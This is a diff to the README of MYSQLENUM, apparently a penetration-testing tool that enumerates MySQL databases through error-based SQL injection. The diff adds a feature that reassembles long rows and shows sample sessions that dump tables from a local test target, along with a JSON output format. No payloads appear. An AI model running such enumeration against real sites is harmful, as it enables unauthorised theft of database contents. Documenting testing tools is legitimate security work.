@@ -35,6 +35,7 @@ While penetration testing you may find yourself in a situation where you have on
  - Debugging option to see the GET, POST requests and their results.
  - Continue enumerating rows using a previously saved json file, removing the need to re-enumerate everything again from scratch.
  - Interactively select the column and tables when enumerating row data.
+ - Option to enumerate complete contents of long rows - Often there will be rows in the database that will exceed the maximum length (32 chars) of the updatexml error message, that we are leveraging though SQL injection to enumerate the database. These rows are truncated before they are returned from the target databse. MYSQLENUM will retrieve the complete contents of these rows part by part and piece them together.
  - Progress bars!
 
 
@@ -171,7 +172,8 @@ The php file connects to a database which has the schema available [here](https:
     | 4   | to_date   |
     +-----+-----------+
 
-Continue enumerating table rows from a previous enumeration session
+**Continue enumerating table rows from a previous enumeration session**
+
 
     $python3 mysql_enum.py -f -u "http://127.0.0.1"
 
@@ -394,27 +396,163 @@ Continue enumerating table rows from a previous enumeration session
     +-----+------------+
     Enumerate rows for another table? [y/n, default:n]: n
 
+**Enumerating full row contents of any long rows found**
+
+    $python3 mysql_enum.py -f -u "http://127.0.0.1/vuln.php"
+
+         ______  _     _  _    _____  _       _______ ______  _     _ ______
+        |  ___ \| |   | || |  / ___ \| |     (_______)  ___ \| |   | |  ___ \
+        | | _ | | |___| | \ \| |   | | |      _____  | |   | | |   | | | _ | |
+        | || || |\_____/   \ \ |   |_| |     |  ___) | |   | | |   | | || || |
+        | || || |  ___ _____) ) \____| |_____| |_____| |   | | |___| | || || |
+        |_||_||_| (___|______/ \_____)_______)_______)_|   |_|\______|_||_||_|
+                                                                        @pyrod
+
+    +-----+----------------------+
+    | No. | Tables               |
+    +-----+----------------------+
+    | 1   | current_dept_emp     |
+    | 2   | departments          |
+    | 3   | dept_emp             |
+    | 4   | dept_emp_latest_date |
+    | 5   | dept_manager         |
+    | 6   | employees            |
+    | 7   | salaries             |
+    | 8   | titles               |
+    +-----+----------------------+
+    Select Table [1-8]: 2
+
+    Table selected: departments (12 rows)
+
+    +-----+-----------+
+    | No. | Columns   |
+    +-----+-----------+
+    | 1   | dept_no   |
+    | 2   | dept_name |
+    +-----+-----------+
+    Select Column to enumerate [1-2]: 2
+    Number of rows to enumerate [Total: 12, Enumerated: 0]: 12
+
+    Column selected: dept_name
+
+
+    Enumerating rows for departments.dept_name
+
+    Enumerated row data: 'Customer Service (16)':   0%|                                                          | 0/12 [00:00<?, ?it/s]Enumerated row data: 'Sales (5)': 100%|█████████████████████████████████████████████████████████████| 12/12 [00:00<00:00, 95.51it/s]
+    +-----+--------------------------------------+
+    | No. | dept_name                            |
+    +-----+--------------------------------------+
+    | 1   | 0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0 (40) |
+    | 2   | 1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1 (40) |
+    | 3   | Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A (40) |
+    | 4   | Customer Service (16)                |
+    | 5   | Development (11)                     |
+    | 6   | Finance (7)                          |
+    | 7   | Human Resources (15)                 |
+    | 8   | Marketing (9)                        |
+    | 9   | Production (10)                      |
+    | 10  | Quality Management (18)              |
+    | 11  | Research (8)                         |
+    | 12  | Sales (5)                            |
+    +-----+--------------------------------------+
+    Long rows present, enumerate them? [y/n, default:n]: y
+    +-----+---------------------------------+---------------+-----------+
+    | No. | Content                         | Actual Length | Row Index |
+    +-----+---------------------------------+---------------+-----------+
+    | 1   | 0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0 | 40            | 0         |
+    | 2   | 1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1 | 40            | 1         |
+    | 3   | Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A | 40            | 2         |
+    +-----+---------------------------------+---------------+-----------+
+    Select the row to enumerate it's complete contents [1-3]: 1
+    Retrieving partial row: 0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0: 100%|███████████████████████████████████████| 1/1 [00:00<00:00, 120.12it/s]
+
+    Contents for 'departments.dept_name[0]':
+    0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3
+
+    Enumerate rows? [y/n, default:n]: y
+    +-----+----------------------+
+    | No. | Tables               |
+    +-----+----------------------+
+    | 1   | current_dept_emp     |
+    | 2   | departments          |
+    | 3   | dept_emp             |
+    | 4   | dept_emp_latest_date |
+    | 5   | dept_manager         |
+    | 6   | employees            |
+    | 7   | salaries             |
+    | 8   | titles               |
+    +-----+----------------------+
+    Select Table [1-8]: 2
+
+    Table selected: departments (12 rows)
+
+    +-----+-----------+
+    | No. | Columns   |
+    +-----+-----------+
+    | 1   | dept_no   |
+    | 2   | dept_name |
+    +-----+-----------+
+    Select Column to enumerate [1-2]: 2
+    Number of rows to enumerate [Total: 12, Enumerated: 12]: 12
+
+    Column selected: dept_name
+
+
+    Enumerating rows for departments.dept_name
+
+    +-----+-----------------------------------------------+
+    | No. | dept_name                                     |
+    +-----+-----------------------------------------------+
+    | 1   | 0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3 (40) |
+    | 2   | 1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1 (40)          |
+    | 3   | Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A (40)          |
+    | 4   | Customer Service (16)                         |
+    | 5   | Development (11)                              |
+    | 6   | Finance (7)                                   |
+    | 7   | Human Resources (15)                          |
+    | 8   | Marketing (9)                                 |
+    | 9   | Production (10)                               |
+    | 10  | Quality Management (18)                       |
+    | 11  | Research (8)                                  |
+    | 12  | Sales (5)                                     |
+    +-----+-----------------------------------------------+
+    Long rows present, enumerate them? [y/n, default:n]: y
+    +-----+---------------------------------+---------------+-----------+
+    | No. | Content                         | Actual Length | Row Index |
+    +-----+---------------------------------+---------------+-----------+
+    | 1   | 1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1 | 40            | 1         |
+    | 2   | Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A | 40            | 2         |
+    +-----+---------------------------------+---------------+-----------+
+    Select the row to enumerate it's complete contents [1-2]: 1
+    Retrieving partial row: 1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1: 100%|███████████████████████████████████████| 1/1 [00:00<00:00, 169.89it/s]
+
+    Contents for 'departments.dept_name[1]':
+    1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4
+
+    Enumerate rows? [y/n, default:n]: n
+
+
 **JSON OUTPUT**
 
 Json output is generated in the following format.
 
     {
-        "date": "2019-08-17 18:26:59.755343",
+        "date": "2019-08-10 15:24:45.516198",
         "params": {
-            "url": "http://127.0.0.1/vuln.php",
+            "target_url": "http://127.0.0.1/vuln.php",
             "data": {
                 "vulnfield": ""
             },
-            "request_type": "get",
             "vuln_field": "vulnfield",
-            "limit": "",
+            "table_limit": "",
+            "debug": null,
             "terminator": "",
-            "debug": null
+            "request_type": "get"
         },
         "info": {
             "dbname": "sampledb",
-            "username": "testuser@192.168.1.120",
-            "version": "5.7.26-0ubuntu0.16.04.1",
+            "username": "testuser@127.0.0.1",
+            "version": "5.7.4-0",
             "table_count": "8"
         },
         "tables": {
@@ -422,79 +560,128 @@ Json output is generated in the following format.
                 "row_count": "300024",
                 "col_count": "4",
                 "cols": {
-                    "emp_no": null,
-                    "dept_no": null,
-                    "from_date": null,
-                    "to_date": null
+                    "emp_no": [],
+                    "dept_no": [],
+                    "from_date": [],
+                    "to_date": []
                 }
             },
             "departments": {
-                "row_count": "9",
+                "row_count": "12",
                 "col_count": "2",
                 "cols": {
-                    "dept_no": null,
-                    "dept_name": null
+                    "dept_no": [],
+                    "dept_name": [
+                        [
+                            "40",
+                            "0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3"
+                        ],
+                        [
+                            "40",
+                            "1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4"
+                        ],
+                        [
+                            "40",
+                            "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A"
+                        ],
+                        [
+                            "16",
+                            "Customer Service"
+                        ],
+                        [
+                            "11",
+                            "Development"
+                        ],
+                        [
+                            "7",
+                            "Finance"
+                        ],
+                        [
+                            "15",
+                            "Human Resources"
+                        ],
+                        [
+                            "9",
+                            "Marketing"
+                        ],
+                        [
+                            "10",
+                            "Production"
+                        ],
+                        [
+                            "18",
+                            "Quality Management"
+                        ],
+                        [
+                            "8",
+                            "Research"
+                        ],
+                        [
+                            "5",
+                            "Sales"
+                        ]
+                    ]
                 }
             },
             "dept_emp": {
                 "row_count": "331603",
                 "col_count": "4",
                 "cols": {
-                    "emp_no": null,
-                    "dept_no": null,
-                    "from_date": null,
-                    "to_date": null
+                    "emp_no": [],
+                    "dept_no": [],
+                    "from_date": [],
+                    "to_date": []
                 }
             },
             "dept_emp_latest_date": {
                 "row_count": "300024",
                 "col_count": "3",
                 "cols": {
-                    "emp_no": null,
-                    "from_date": null,
-                    "to_date": null
+                    "emp_no": [],
+                    "from_date": [],
+                    "to_date": []
                 }
             },
             "dept_manager": {
                 "row_count": "24",
                 "col_count": "4",
                 "cols": {
-                    "emp_no": null,
-                    "dept_no": null,
-                    "from_date": null,
-                    "to_date": null
+                    "emp_no": [],
+                    "dept_no": [],
+                    "from_date": [],
+                    "to_date": []
                 }
             },
             "employees": {
                 "row_count": "300029",
                 "col_count": "6",
                 "cols": {
-                    "emp_no": null,
-                    "birth_date": null,
-                    "first_name": null,
-                    "last_name": null,
-                    "gender": null,
-                    "hire_date": null
+                    "emp_no": [],
+                    "birth_date": [],
+                    "first_name": [],
+                    "last_name": [],
+                    "gender": [],
+                    "hire_date": []
                 }
             },
             "salaries": {
                 "row_count": "2844047",
                 "col_count": "4",
                 "cols": {
-                    "emp_no": null,
-                    "salary": null,
-                    "from_date": null,
-                    "to_date": null
+                    "emp_no": [],
+                    "salary": [],
+                    "from_date": [],
+                    "to_date": []
                 }
             },
             "titles": {
                 "row_count": "443308",
                 "col_count": "4",
                 "cols": {
-                    "emp_no": null,
-                    "title": null,
-                    "from_date": null,
-                    "to_date": null
+                    "emp_no": [],
+                    "title": [],
+                    "from_date": [],
+                    "to_date": []
                 }
             }
         }
